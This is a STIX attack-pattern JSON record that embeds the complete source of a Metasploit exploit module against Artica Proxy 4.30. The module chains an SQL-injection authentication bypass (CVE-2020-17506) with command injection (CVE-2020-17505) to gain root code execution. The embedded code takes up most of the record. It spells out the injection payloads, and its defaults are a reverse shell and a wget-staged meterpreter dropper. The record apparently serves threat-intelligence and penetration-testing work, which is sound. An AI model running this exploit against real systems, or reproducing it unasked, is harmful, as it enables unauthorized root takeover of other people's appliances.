{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--40d65837-7730-4e10-95ef-7e13822cfa7b",
    "created": "2024-08-14T17:04:14.73221Z",
    "modified": "2024-08-14T17:04:14.732214Z",
    "name": "Artica proxy 4.30.000000 Auth Bypass service-cmds-peform Command Injection",
    "description": " This module exploits an authenticated command injection vulnerability in Artica Proxy, combined with an authentication bypass discovered on the same version, it is possible to trigger the vulnerability without knowing the credentials. The application runs in virtual appliance, successful exploitation of this vulnerability yields remote code execution as root on the remote system.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/artica_proxy_auth_bypass_service_cmds_peform_command_injection.rb",
            "external_id": "artica_proxy_auth_bypass_service_cmds_peform_command_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.max0x4141.com/post/artica_proxy/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Artica proxy 4.30.000000 Auth Bypass service-cmds-peform Command Injection',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability in Artica Proxy, combined with an authentication bypass\n          discovered on the same version, it is possible to trigger the vulnerability without knowing the credentials.\n          The application runs in virtual appliance, successful exploitation of this vulnerability yields remote code execution as root on the\n          remote system.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Max0x4141', # discovery\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # msf module\n        ],\n        'References' => [\n          ['CVE', '2020-17505'], # RCE\n          ['CVE', '2020-17506'], # Auth bypass\n          ['EDB', '48744'],\n          ['PACKETSTORM', '158868'],\n          ['URL', 'https://blog.max0x4141.com/post/artica_proxy/']\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPort' => 9000\n        },\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_command,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_perl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => 'wget',\n                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-08-09',\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Artica Proxy', '/']),\n        OptString.new('PHPSESSID', [false, 'The cookie obtained after successful authentication, if present'])\n      ]\n    )\n\n    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963\n    import_target_defaults\n  end\n\n  def check\n    if datastore['PHPSESSID']\n      @phpsessid = datastore['PHPSESSID']\n    else\n      check_result = auth_bypass\n      return check_result unless check_result == CheckCode::Vulnerable\n\n      @phpsessid = check_result.reason\n    end\n    rand_string = Rex::Text.rand_text_alphanumeric(4..16)\n    if execute_command(\"echo #{Rex::Text.encode_base64(rand_string)}|base64 -d\").include?(rand_string)\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status 'Attempting to gain RCE via CVE-2020-17505'\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'cyrus.index.php'),\n      'vars_get' => {\n        'service-cmds-peform' => \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\"\n      },\n      'cookie' => \"PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1\"\n    })\n    res ? res.body : ''\n  end\n\n  def auth_bypass\n    serialized_object = 'a:2:{s:3:\"uid\";s:4:\"-100\";s:22:\"ACTIVE_DIRECTORY_INDEX\";s:1:\"1\";}'\n    apikey = \"' UNION select 1,'#{Rex::Text.encode_base64(serialized_object)}';\"\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'fw.login.php'),\n      'vars_get' => {\n        'apikey' => apikey\n      }\n    })\n    return Exploit::CheckCode::Unknown(\"Unable to connect to #{target_uri.path}\") unless res\n    return Exploit::CheckCode::Safe('Authentication failed') unless res && [200, 301, 302].include?(res.code)\n\n    Exploit::CheckCode::Vulnerable(res.get_cookies[/PHPSESSID=(.+?);/, 1])\n  end\n\n  def exploit\n    if datastore['PHPSESSID']\n      @phpsessid = datastore['PHPSESSID']\n    else\n      print_status 'Attempting to bypass authentication via CVE-2020-17506 (SQL injection)'\n      bypass_result = auth_bypass\n      case bypass_result\n      when CheckCode::Safe then fail_with(Failure::NoAccess, bypass_result.reason)\n      when CheckCode::Unknown then fail_with(Failure::Unknown, bypass_result.reason)\n      else @phpsessid = bypass_result.reason\n      end\n    end\n    print_good \"Session cookie : #{@phpsessid}\"\n    case target['Type']\n    when :unix_command then execute_command(payload.encoded)\n    when :linux_dropper then execute_cmdstager\n    else\n      fail_with(Failure::BadConfig, 'Invalid target specified')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-08-09",
    "x_mitre_platforms": [
        "linux'"
    ]
}